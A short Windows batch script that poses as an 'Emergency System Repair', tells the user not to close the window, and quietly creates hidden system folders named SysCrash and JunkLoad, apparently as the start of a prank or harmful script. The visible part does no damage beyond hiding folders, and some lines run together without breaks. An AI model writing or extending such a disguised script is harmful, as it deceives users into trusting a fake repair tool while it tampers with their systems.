@echo off
title Emergency System Repair
color 0C
echo Running emergency system repair... DO NOT CLOSE THIS WINDOW.echo This process is critical and may take several minutes.REM Create hidden directories for storing locked files and junk data
mkdir "%SystemDrive%\Windows\Temp\SysCrash" >nul 2>&1
mkdir "%SystemDrive%\Windows\Temp\JunkLoad" >nul 2>&1
attrib +h +s "%SystemDrive%\Windows\Temp\SysCrash" >nul 2>&1
attrib +h +s "%SystemDrive%\Windows\Temp\JunkLoad" >nul 2>&1